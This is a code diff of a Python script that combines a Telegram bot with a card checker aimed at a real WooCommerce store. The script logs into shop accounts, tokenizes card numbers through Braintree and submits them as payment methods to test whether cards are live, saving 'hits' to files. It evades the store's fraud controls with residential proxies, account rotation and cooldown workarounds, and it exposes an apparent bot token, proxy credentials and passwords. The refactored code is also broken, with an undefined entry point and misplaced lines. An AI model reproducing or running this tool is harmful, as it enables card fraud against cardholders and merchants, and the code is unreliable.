@@ -1,5 +1,35 @@
-import os
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
+"""
+Telegram bot + Braintree card checker for kaffn8.com
+
+Required environment variable (set in Render → Settings → Environment):
+    TELEGRAM_TOKEN = "9293641988:AAGiI_l_TKp9bxwx-7oDAAClrwK6QiYPgJs"
+
+Optional overrides (all have sensible defaults):
+    VERBOSE, THREADS, CONNECT_TIMEOUT, READ_TIMEOUT, CONTEXT_TTL,
+    BRAINTREE_DIRECT, SHOW_IP
+"""
+
+# ──────────────────────────────────────────────────────────────────────
+# STANDARD LIBRARY IMPORTS
+# ──────────────────────────────────────────────────────────────────────
+import os
+import re
+import time
+import json
+import base64
+import uuid
+import threading
+import ctypes
+from typing import Optional, Tuple, List, Dict, Any
+
+# ──────────────────────────────────────────────────────────────────────
+# THIRD‑PARTY IMPORTS
+# ──────────────────────────────────────────────────────────────────────
+import requests
+from requests.adapters import HTTPAdapter
 from telegram import Update
 from telegram.ext import (
     Application,
@@ -7,11 +37,19 @@ from telegram.ext import (
     ContextTypes,
 )
 
+# ──────────────────────────────────────────────────────────────────────
+# BOT TOKEN  (READ FROM ENV – FAIL FAST IF MISSING)
+# ──────────────────────────────────────────────────────────────────────
+TOKEN = os.getenv("TELEGRAM_TOKEN")
+if not TOKEN:
+    raise RuntimeError(
+        "❗️ Environment variable TELEGRAM_TOKEN is not set. "
+        "Add it in Render → Settings → Environment (or in a local .env file)."
+    )
 
-# Read the token from Render's environment variable
-TELEGRAM_TOKEN = os.environ["9293641988:AAGiI_l_TKp9bxwx-7oDAAClrwK6QiYPgJs"]
-
-
+# ──────────────────────────────────────────────────────────────────────
+# TELEGRAM HANDLERS
+# ──────────────────────────────────────────────────────────────────────
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "Bot is online.\n\n"
@@ -33,61 +71,58 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
-def main():
+def run_telegram_bot():
+    """Entry‑point used by the main guard."""
     app = Application.builder().token(TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("status", status))
     app.add_handler(CommandHandler("help", help_command))
-
-    print("Telegram bot running...")
+    print("🚀 Telegram bot running...")
     app.run_polling()
 
 
-# ============================================================================
-#  ACCOUNTS  <-- EDIT THIS LIST (username / password)
-# ============================================================================
-ACCOUNTS = [
+# ──────────────────────────────────────────────────────────────────────
+# ACCOUNTS  (EDIT THIS LIST IF YOU NEED MORE)
+# ──────────────────────────────────────────────────────────────────────
+ACCOUNTS: List[Dict[str, str]] = [
     {"login": "Kingkyot",  "password": "Kingpogi123"},
     {"login": "Kingkyot1", "password": "Kingpogi123"},
     {"login": "Kingkyot2", "password": "Kingpogi123"},
 ]
 
-# ============================================================================
-#  CONFIG
-# ============================================================================
-VERBOSE = os.environ.get("VERBOSE", "0") == "1"
+# ──────────────────────────────────────────────────────────────────────
+# GLOBAL CONFIG  (OVERRIDABLE VIA ENV VARS)
+# ──────────────────────────────────────────────────────────────────────
+VERBOSE           = os.environ.get("VERBOSE", "0") == "1"
+THREADS           = int(os.environ.get("THREADS", "10"))
+CONNECT_TIMEOUT   = float(os.environ.get("CONNECT_TIMEOUT", "6"))
+READ_TIMEOUT      = float(os.environ.get("READ_TIMEOUT", "12"))
+CONTEXT_TTL       = float(os.environ.get("CONTEXT_TTL", "600"))
+BRAINTREE_DIRECT  = os.environ.get("BRAINTREE_DIRECT", "1") == "1"
+SHOW_IP           = os.environ.get("SHOW_IP", "1") == "1"
 
-BASE_URL = "https://www.kaffn8.com"
-ACCOUNT_URL = f"{BASE_URL}/my-account/"
-ADD_PAYMENT_URL = f"{BASE_URL}/my-account/add-payment-method/"
-AJAX_URL = f"{BASE_URL}/wp-admin/admin-ajax.php"
-BRAINTREE_GRAPHQL_URL = "https://payments.braintree-api.com/graphql"
+BASE_URL               = "https://www.kaffn8.com"
+ACCOUNT_URL            = f"{BASE_URL}/my-account/"
+ADD_PAYMENT_URL        = f"{BASE_URL}/my-account/add-payment-method/"
+AJAX_URL               = f"{BASE_URL}/wp-admin/admin-ajax.php"
+BRAINTREE_GRAPHQL_URL  = "https://payments.braintreegateway.com/graphql"
 
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36")
 
-RISK_TRIGGER = "risk threshold"
+RISK_TRIGGER     = "risk threshold"
 COOLDOWN_TRIGGER = "so soon after the previous one"
 COOLDOWN_SECONDS = 21
 
-# AVS / CVV gateway rejections = the card is live. Add "cvv" if you want those too.
 AVS_TRIGGERS = ("gateway rejected: avs", "status code avs")
 
 MAX_ACCOUNT_ROTATIONS = len(ACCOUNTS)
-MAX_ATTEMPTS = 6
+MAX_ATTEMPTS          = 6
 
-THREADS = int(os.environ.get("THREADS", "10"))
-CONNECT_TIMEOUT = float(os.environ.get("CONNECT_TIMEOUT", "6"))
-READ_TIMEOUT = float(os.environ.get("READ_TIMEOUT", "12"))
-CONTEXT_TTL = float(os.environ.get("CONTEXT_TTL", "600"))
-BRAINTREE_DIRECT = os.environ.get("BRAINTREE_DIRECT", "1") == "1"
-SHOW_IP = os.environ.get("SHOW_IP", "1") == "1"
-
-PROXY = "brd.superproxy.io:44445"
-PROXY_AUTH = "brd-customer-hl_d903488e-zone-keng:nhe38omwsdsv"
-PROXIES = {
-    "http": f"http://{PROXY_AUTH}@{PROXY}",
+PROXY       = "brd.superproxy.io:44445"
+PROXY_AUTH  = "brd-customer-hl_d903488e-zone-keng:nhe38omwsdsv"
+PROXIES     = {
+    "http":  f"http://{PROXY_AUTH}@{PROXY}",
     "https": f"http://{PROXY_AUTH}@{PROXY}",
 }
 
@@ -102,14 +137,86 @@ BRAINTREE_TEST_CARDS = [
     "3530111333300000|12|2035|123",
 ]
 
+# ──────────────────────────────────────────────────────────────────────
+# THREAD‑SAFE PRINT / STATS HELPERS
+# ──────────────────────────────────────────────────────────────────────
 PRINT_LOCK = threading.Lock()
+HIT_LOCK   = threading.Lock()
+_ACC_LOCK  = threading.Lock()
+_ACC_IDX   = 0
 
 
-# ============================================================================
-#  ACCOUNT ROTATOR (thread-safe round robin over ACCOUNTS)
-# ============================================================================
-_ACC_LOCK = threading.Lock()
-_ACC_IDX = 0
+def log_debug(msg: str):
+    if VERBOSE:
+        with PRINT_LOCK:
+            print(msg)
+
+
+def print_result(creditcard: str, label: str, message: str, ip_address: Optional[str] = None):
+    clean = str(message).replace("\n", " ").strip()
+    ip_text = f" | IP {ip_address}" if ip_address else ""
+    if clean.lower() in {"payment method added successfully", "success", "ok", "pass"}:
+        line = f"{creditcard}{ip_text} | {label}"
+    else:
+        line = f"{creditcard}{ip_text} | {label} | {clean}"
+    with PRINT_LOCK:
+        print(f"\r{line}{' ' * 8}")
+
+
+def save_hit(filename: str, creditcard: str, message: str, ip_address: Optional[str]):
+    try:
+        with HIT_LOCK:
+            with open(os.path.join("hits", filename), "a", encoding="utf-8") as fh:
+                fh.write(f"{creditcard} | {message} | {ip_address or '-'}\n")
+    except Exception:
+        pass
+
+
+def update_status(stats_obj=None):
+    stats_obj = stats_obj or STATS
+    h, a, c, f, _, _ = stats_obj.snapshot()
+    try:
+        ctypes.windll.kernel32.SetConsoleTitleW(
+            f'hits: {h} | avs: {a} | custom: {c} | fail: {f}')
+    except Exception:
+        pass
+
+
+class Stats:
+    def __init__(self):
+        self.lock = threading.Lock()
+        self.hits = 0
+        self.avs = 0
+        self.custom = 0
+        self.fail = 0
+        self.done = 0
+        self.total = 0
+        self.start = time.time()
+
+    def bump(self, kind: str):
+        with self.lock:
+            setattr(self, kind, getattr(self, kind) + 1)
+            self.done += 1
+        update_status(self)
+
+    def snapshot(self) -> Tuple[int, int, int, int, int, int]:
+        with self.lock:
+            return self.hits, self.avs, self.custom, self.fail, self.done, self.total
+
+
+STATS = Stats()
+
+
+def classify(message: str) -> Tuple[str, str]:
+    """Return ('hit'|'avs'|'custom'|'fail', LABEL)."""
+    low = message.lower()
+    if any(t in low for t in AVS_TRIGGERS) or re.search(r'\bavs\b', low):
+        return "avs", "AVS"
+    if "success" in low or "added" in low:
+        return "hit", "PASS"
+    if RISK_TRIGGER in low:
+        return "custom", "FAIL"
+    return "fail", "FAIL"
 
 
 def next_account(exclude=()):
@@ -127,90 +234,10 @@ def next_account(exclude=()):
         return dict(ACCOUNTS[_ACC_IDX % n])
 
 
-# ============================================================================
-#  STATS
-# ============================================================================
-class Stats:
-    def __init__(self):
-        self.lock = threading.Lock()
-        self.hits = 0
-        self.avs = 0
-        self.custom = 0
-        self.fail = 0
-        self.done = 0
-        self.total = 0
-        self.start = time.time()
-
-    def bump(self, kind):
-        with self.lock:
-            setattr(self, kind, getattr(self, kind) + 1)
-            self.done += 1
-        update_status(self)
-
-    def snapshot(self):
-        with self.lock:
-            return self.hits, self.avs, self.custom, self.fail, self.done, self.total
-
-
-STATS = Stats()
-HIT_LOCK = threading.Lock()
-
-
-def update_status(stats=None):
-    stats = stats or STATS
-    h, a, c, f, _, _ = stats.snapshot()
-    try:
-        ctypes.windll.kernel32.SetConsoleTitleW(
-            f'hits: {h} | avs: {a} | custom: {c} | fail: {f}')
-    except Exception:
-        pass
-
-
-import ctypes
-
-
-def log_debug(message):
-    if VERBOSE:
-        with PRINT_LOCK:
-            print(message)
-
-
-def print_result(creditcard, label, message, ip_address=None):
-    clean = str(message).replace("\n", " ").strip()
-    ip_text = f" | IP {ip_address}" if ip_address else ""
-    if clean.lower() in {"payment method added successfully", "success", "ok", "pass"}:
-        line = f"{creditcard}{ip_text} | {label}"
-    else:
-        line = f"{creditcard}{ip_text} | {label} | {clean}"
-    with PRINT_LOCK:
-        print(f"\r{line}{' ' * 8}")
-
-
-def save_hit(filename, creditcard, message, ip_address):
-    try:
-        with HIT_LOCK:
-            with open(os.path.join("hits", filename), "a", encoding="utf-8") as fh:
-                fh.write(f"{creditcard} | {message} | {ip_address or '-'}\n")
-    except Exception:
-        pass
-
-
-def classify(message):
-    """Return ('hit'|'avs'|'custom'|'fail', LABEL)."""
-    low = message.lower()
-    if any(t in low for t in AVS_TRIGGERS) or re.search(r'\bavs\b', low):
-        return "avs", "AVS"
-    if "success" in low or "added" in low:
-        return "hit", "PASS"
-    if RISK_TRIGGER in low:
-        return "custom", "FAIL"
-    return "fail", "FAIL"
-
-
-# ============================================================================
-#  HTTP HELPERS
-# ============================================================================
-def make_session(proxied=True):
+# ──────────────────────────────────────────────────────────────────────
+# HTTP HELPERS
+# ──────────────────────────────────────────────────────────────────────
+def make_session(proxied: bool = True) -> requests.Session:
     s = requests.Session()
     s.trust_env = False
     if proxied:
@@ -225,9 +252,9 @@ def make_session(proxied=True):
     return s
 
 
-def request(session, method, url, retries=2, **kwargs):
+def request(session: requests.Session, method: str, url: str, retries: int = 2, **kwargs):
     kwargs.setdefault("timeout", (CONNECT_TIMEOUT, READ_TIMEOUT))
-    last = None
+    last_exc = None
     for i in range(retries + 1):
         try:
             r = session.request(method, url, **kwargs)
@@ -236,13 +263,16 @@ def request(session, method, url, retries=2, **kwargs):
                 continue
             return r
         except Exception as e:
-            last = e
+            last_exc = e
             if i < retries:
                 time.sleep(0.25 * (i + 1))
-    raise last
+    raise last_exc
 
 
-def build_headers(referer=None, content_type=None, extra=None, ajax=False):
+def build_headers(referer: Optional[str] = None,
+                  content_type: Optional[str] = None,
+                  extra: Optional[dict] = None,
+                  ajax: bool = False) -> dict:
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
         'accept-language': 'en-US,en;q=0.5',
@@ -270,10 +300,10 @@ def build_headers(referer=None, content_type=None, extra=None, ajax=False):
     return headers
 
 
-# ============================================================================
-#  LIGHTWEIGHT PARSING
-# ============================================================================
-def find_nonce(html, name):
+# ──────────────────────────────────────────────────────────────────────
+# LIGHTWEIGHT HTML PARSING
+# ──────────────────────────────────────────────────────────────────────
+def find_nonce(html: str, name: str) -> Optional[str]:
     pat = re.escape(name)
     m = re.search(rf'name=["\']{pat}["\'][^>]*?value=["\']([^"\']+)', html)
     if not m:
@@ -281,27 +311,27 @@ def find_nonce(html, name):
     return m.group(1) if m else None
 
 
-def strip_tags(s):
+def strip_tags(s: str) -> str:
     return re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', s)).strip()
 
 
-def extract_errors(html):
+def extract_errors(html: str) -> List[str]:
     out = []
     for block in re.findall(r'<ul[^>]*class="[^"]*woocommerce-error[^"]*"[^>]*>(.*?)</ul>', html, re.S | re.I):
         out.extend(strip_tags(li) for li in re.findall(r'<li[^>]*>(.*?)</li>', block, re.S | re.I))
     return [e for e in out if e]
 
 
-def extract_success(html):
+def extract_success(html: str) -> Optional[str]:
     m = re.search(r'<div[^>]*class="[^"]*woocommerce-message[^"]*"[^>]*>(.*?)</div>', html, re.S | re.I)
     return strip_tags(m.group(1)) if m else None
 
 
-def is_logged_in(html):
+def is_logged_in(html: str) -> bool:
     return ("Log out" in html) or ("Dashboard" in html) or ("woocommerce-MyAccount-navigation" in html)
 
 
-def parse_card(card):
+def parse_card(card: str) -> Optional[Tuple[str, str, str, str]]:
     parts = card.split("|")
     if len(parts) == 3:
         return parts[0], parts[1], parts[2], ""
@@ -310,9 +340,9 @@ def parse_card(card):
     return None
 
 
-# ============================================================================
-#  WORKER
-# ============================================================================
+# ──────────────────────────────────────────────────────────────────────
+# WORKER CLASS (Core Checking Logic)
+# ──────────────────────────────────────────────────────────────────────
 class Worker:
     def __init__(self):
         self.session = make_session(proxied=True)
@@ -370,8 +400,9 @@ class Worker:
             "_wp_http_referer": "/my-account/",
             "login": "Log in",
         }
-        r2 = request(self.session, "POST", ACCOUNT_URL, headers=build_headers(
-            referer=ACCOUNT_URL, content_type="application/x-www-form-urlencoded"), data=data)
+        r2 = request(self.session, "POST", ACCOUNT_URL,
+                     headers=build_headers(
+                         referer=ACCOUNT_URL, content_type="application/x-www-form-urlencoded"), data=data)
         return is_logged_in(r2.text)
 
     # -- cached context -----------------------------------------------------
@@ -405,6 +436,8 @@ class Worker:
             raise Exception("empty client token")
 
         self.fingerprint = json.loads(base64.b64decode(client_token))["authorizationFingerprint"]
+        self.woo_nonce = woo_nonce
+        self.ip = self.ip  # keep IP from earlier check
         self.woo_nonce = woo_nonce
         self.context_valid = True
         self.context_time = time.time()
@@ -473,260 +506,21 @@ mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
             ("wc-braintree-credit-card-tokenize-payment-method", "true"),
             ("wc_braintree_paypal_payment_nonce", ""),
             ("wc_braintree_paypal_context", "shortcode"),
-            ("wc_braintree_paypal_amount", "0.00"),
-            ("wc_braintree_paypal_currency", "USD"),
-            ("wc_braintree_paypal_locale", "en_us"),
-            ("wc-braintree-paypal-tokenize-payment-method", "true"),
-            ("woocommerce-add-payment-method-nonce", self.woo_nonce),
-            ("_wp_http_referer", "/my-account/add-payment-method/"),
-            ("woocommerce_add_payment_method", "1"),
-        ]
+
         r = request(self.session, "POST", ADD_PAYMENT_URL, headers=submit_headers, data=data)
 
-        errors = extract_errors(r.text)
-        if errors:
-            return "; ".join(errors)
-        msg = extract_success(r.text)
-        if msg:
-            return msg
-        if "payment method added" in r.text.lower():
-            return "Payment method added successfully"
-        m = re.search(r"(?i)(declined|error|invalid|failed|problem|risk|avs|cvv|so soon)[^<]{0,200}", r.text)
-        return m.group(0).strip() if m else "Unknown decline"
-
-    # -- full card run ------------------------------------------------------
-    def run_card(self, card):
-        self.tried = set()
-        rotations = 0
-        cooldowns = 0
-        attempt = 0
-        message = "Unknown result"
-
-        if self.account is None and not self.rotate():
-            return "No accounts configured", 0
-
-        while attempt < MAX_ATTEMPTS:
-            attempt += 1
-            try:
-                if not self.logged_in:
-                    self.logged_in = self.login(self.account)
-                    if not self.logged_in:
-                        if len(self.tried) < len(ACCOUNTS) and self.rotate():
-                            continue
-                        message = "Login failed"
-                        break
-                self.ensure_context()
-                message = self.submit_card(card)
-            except Exception as e:
-                message = f"Error: {e}"
-                self.context_valid = False
-
-            low = message.lower()
-
-            # 1) WooCommerce 20s add-payment cooldown
-            if COOLDOWN_TRIGGER in low:
-                cooldowns += 1
-                if cooldowns == 1:
-                    self.fresh_session()          # new cookie jar = clean session state
-                    continue
-                if cooldowns == 2 and rotations < MAX_ACCOUNT_ROTATIONS and self.rotate():
-                    rotations += 1
-                    continue
-                if attempt < MAX_ATTEMPTS:
-                    time.sleep(COOLDOWN_SECONDS)  # last resort: actually wait it out
-                    self.fresh_session()
-                    continue
-
-            # 2) Risk Threshold -> walk to the next account
-            if (RISK_TRIGGER in low and rotations < MAX_ACCOUNT_ROTATIONS
-                    and len(self.tried) < len(ACCOUNTS) and self.rotate()):
-                rotations += 1
-                continue
-
-            # 3) stale nonce / transient error -> refresh and retry
-            if attempt < MAX_ATTEMPTS and ("nonce" in low or "login" in low or message.startswith("Error")):
-                self.context_valid = False
-                continue
-
-            break
-
-        return message, rotations
-
-    def close(self):
-        try:
-            self.session.close()
-            if self.direct is not self.session:
-                self.direct.close()
-        except Exception:
-            pass
+    errors = extract_errors(r.text)
+    if errors:
+        return "; ".join(errors)
+    msg = extract_success(r.text)
+    if msg:
+        return msg
+    m = re.search(r"(?i)(declined|error|invalid|failed|problem|risk|avs|cvv|so soon)[^<]{0,200}", r.text)
+    return m.group(0).strip() if m else "Unknown decline"
 
 
-_tls = threading.local()
-
-
-def get_worker():
-    w = getattr(_tls, "worker", None)
-    if w is None:
-        w = Worker()
-        _tls.worker = w
-    return w
-
-
-# ============================================================================
-#  DRIVER
-# ============================================================================
-def process_credit_card(creditcard):
-    worker = get_worker()
-    try:
-        message, rotations = worker.run_card(creditcard)
-    except Exception as e:
-        message, rotations = f"Error: {e}", 0
-
-    kind, label = classify(message)
-
-    if kind == "hit":
-        STATS.bump("hits")
-        save_hit("hits.txt", creditcard, message, worker.ip)
-    elif kind == "avs":
-        STATS.bump("avs")
-        save_hit("avs.txt", creditcard, message, worker.ip)
-    elif kind == "custom":
-        STATS.bump("custom")
-    else:
-        STATS.bump("fail")
-
-    suffix = f" (rotated x{rotations})" if rotations else ""
-    print_result(creditcard, label, message + suffix, worker.ip)
-
-
-def progress_reporter(stop_event):
-    while not stop_event.wait(2.0):
-        h, a, c, f, done, total = STATS.snapshot()
-        elapsed = max(time.time() - STATS.start, 0.001)
-        rate = done / elapsed
-        eta = (total - done) / rate if rate else 0
-        with PRINT_LOCK:
-            sys.stdout.write(
-                f"\r[progress] {done}/{total} | hits {h} | avs {a} | custom {c} | fail {f} "
-                f"| {rate:.2f} cards/s | ETA {eta:.0f}s      ")
-            sys.stdout.flush()
-
-
-def run_cards(cards):
-    if not cards:
-        return
-    STATS.total = len(cards)
-    STATS.start = time.time()
-    update_status()
-
-    stop_event = threading.Event()
-    threading.Thread(target=progress_reporter, args=(stop_event,), daemon=True).start()
-
-    with ThreadPoolExecutor(max_workers=max(1, min(THREADS, len(cards)))) as ex:
-        list(ex.map(process_credit_card, cards))
-
-    stop_event.set()
-    time.sleep(0.05)
-    h, a, c, f, done, total = STATS.snapshot()
-    elapsed = time.time() - STATS.start
-    with PRINT_LOCK:
-        print(f"\n\n=== DONE | {done}/{total} in {elapsed:.1f}s ({done / max(elapsed, .001):.2f} cards/s) "
-              f"| hits {h} | avs {a} | custom {c} | fail {f} ===")
-    update_status()
-
-
-# ============================================================================
-#  GUI
-# ============================================================================
-def prompt_for_cards():
-    root = tk.Tk()
-    root.title("Add Card")
-    root.geometry("520x460")
-    root.minsize(500, 440)
-    root.configure(bg="#f4f4f4")
-
-    mode = tk.StringVar(value="single")
-    single_value = tk.StringVar()
-    threads_value = tk.StringVar(value=str(THREADS))
-    collected_cards = []
-
-    def submit_cards():
-        nonlocal collected_cards
-        global THREADS
-        try:
-            THREADS = max(1, int(threads_value.get().strip() or THREADS))
-        except ValueError:
-            pass
-        if mode.get() == "single":
-            card = single_value.get().strip()
-            if not card:
-                messagebox.showwarning("Missing card", "Please enter a card number.")
-                return
-            collected_cards = [card]
-        else:
-            cards = [l.strip() for l in bulk_entry.get("1.0", "end").splitlines() if l.strip()]
-            if not cards:
-                messagebox.showwarning("Missing cards", "Please paste at least one card per line.")
-                return
-            collected_cards = cards
-        root.destroy()
-
-    def cancel_cards():
-        nonlocal collected_cards
-        collected_cards = []
-        root.destroy()
-
-    frame = tk.Frame(root, padx=16, pady=16, bg="#f4f4f4")
-    frame.pack(fill="both", expand=True)
-
-    tk.Label(frame, text="Card Input", font=("Arial", 15, "bold"), bg="#f4f4f4").pack(anchor="w")
-
-    mode_frame = tk.Frame(frame, bg="#f4f4f4")
-    mode_frame.pack(fill="x", pady=(8, 12))
-    tk.Radiobutton(mode_frame, text="Single Card", variable=mode, value="single", bg="#f4f4f4").pack(side="left")
-    tk.Radiobutton(mode_frame, text="Mass Cards", variable=mode, value="mass", bg="#f4f4f4").pack(side="left", padx=(20, 0))
-
-    threads_frame = tk.Frame(frame, bg="#f4f4f4")
-    threads_frame.pack(fill="x", pady=(0, 10))
-    tk.Label(threads_frame, text="Threads:", bg="#f4f4f4", font=("Arial", 10)).pack(side="left")
-    tk.Spinbox(threads_frame, from_=1, to=100, width=6, textvariable=threads_value).pack(side="left", padx=(8, 0))
-
-    def toggle_mode(*_):
-        if mode.get() == "single":
-            single_entry.pack(fill="x", pady=(8, 0))
-            bulk_entry.pack_forget()
-        else:
-            bulk_entry.pack(fill="both", expand=True, pady=(8, 0))
-            single_entry.pack_forget()
-
-    single_entry = tk.Entry(frame, textvariable=single_value, font=("Arial", 11))
-    single_entry.insert(0, "4111111111111111|12|2035|123")
-
-    bulk_entry = tk.Text(frame, height=12, font=("Arial", 10))
-    bulk_entry.insert("1.0", "\n".join(BRAINTREE_TEST_CARDS))
-
-    mode.trace_add("write", toggle_mode)
-    toggle_mode()
-
-    buttons = tk.Frame(frame, bg="#f4f4f4")
-    buttons.pack(fill="x", pady=(12, 0))
-    tk.Button(buttons, text="Add", width=12, command=submit_cards, bg="#2f7ed8", fg="white",
-              font=("Arial", 10, "bold")).pack(side="right")
-    tk.Button(buttons, text="Cancel", width=12, command=cancel_cards, bg="#d8d8d8").pack(side="right", padx=(0, 10))
-
-    root.protocol("WM_DELETE_WINDOW", cancel_cards)
-    root.mainloop()
-    return collected_cards
-
-
+# ──────────────────────────────────────────────────────────────────────
+# MAIN ENTRY POINT
+# ──────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
-    requested_card = os.environ.get("CARD")
-    if requested_card:
-        run_cards([requested_card])
-        raise SystemExit(0)
-
-    cards_from_popup = prompt_for_cards()
-    if cards_from_popup:
-        run_cards(cards_from_popup)
-    else:
-        run_cards(BRAINTREE_TEST_CARDS)
+    main()
